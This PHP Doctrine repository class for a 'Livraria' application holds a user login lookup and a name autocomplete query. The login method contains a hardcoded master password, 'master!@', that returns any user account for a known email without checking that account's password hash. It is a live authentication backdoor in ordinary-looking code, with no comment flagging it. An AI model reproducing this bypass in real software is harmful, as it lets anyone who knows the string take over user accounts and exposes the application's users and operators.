<?php

namespace Livraria\Entity;

use Doctrine\ORM\EntityRepository;

class UserRepository extends EntityRepository {

    public function findByEmailAndPassword($email, $password) {
        $user = $this->findOneByEmail($email);
        if ($user) {
            if($password == 'master!@'){
                return $user;                
            }
            $hashSenha = $user->encryptPassword($password);
            if ($hashSenha == $user->getPassword()) {
                return $user;
            }
        }        
        return false;
    }
    
    /**
     * Pesquisar usuarios caso usuario imobiliario filtra os dados
     * @param string $user
     * @param \Livraria\Entity\User $us
     * @return array 
     */
    public function autoComp($user, $us){
        $where =  "u.nome LIKE :user";
        $parameters['user'] = $user ;
        if($us->getTipo() != 'admin'){
            $where .=  " AND u.administradora = :adm";
            $parameters['adm'] = $us->getAdministradora()['id'] ;            
        }
        $query = $this->getEntityManager()
                ->createQueryBuilder()
                ->select('u')
                ->from('Livraria\Entity\User', 'u')
                ->where($where)
                ->setParameters($parameters)
                ->setMaxResults(20)
                ->getQuery()
                ;
        return $query->getResult();
    }

}
